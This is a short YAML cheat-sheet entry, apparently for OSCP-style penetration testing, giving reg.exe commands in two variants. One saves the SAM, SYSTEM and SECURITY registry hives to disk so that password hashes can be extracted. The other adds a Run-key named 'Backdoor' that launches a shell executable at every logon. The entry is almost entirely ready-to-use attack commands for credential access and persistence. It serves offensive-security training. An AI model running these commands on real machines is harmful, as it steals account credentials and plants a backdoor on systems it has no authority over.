---
variants:
  - label: save-sam
    command: |
      reg save HKLM\SAM C:\Temp\SAM
      reg save HKLM\SYSTEM C:\Temp\SYSTEM
      reg save HKLM\SECURITY C:\Temp\SECURITY
  - label: run-persistence
    command: |
      reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe" /f
description: Use reg.exe to dump hives or set a Run-key, by action.
os: [Windows]
category: [oscp]
service: [AD]
phase: [CredAccess, Persistence]
references:
  - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg
---
